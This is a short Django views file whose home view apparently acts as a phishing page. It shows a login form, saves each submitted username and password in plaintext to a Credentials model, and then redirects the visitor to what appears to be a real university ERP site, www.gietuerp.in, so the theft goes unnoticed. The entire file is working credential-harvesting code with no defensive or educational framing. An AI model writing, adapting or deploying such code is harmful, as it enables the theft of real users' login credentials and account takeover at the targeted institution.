from django.shortcuts import render,redirect
from .models import *

# Create your views here.
def home(request):
    if request.method == 'POST':
        UserName=request.POST['vchUserName']
        Password=request.POST['vchPassword']
        member = Credentials(UserName=UserName, Password=Password)
        member.save()
        return redirect("https://www.gietuerp.in/")
    else:
        return render(request,"Login.html")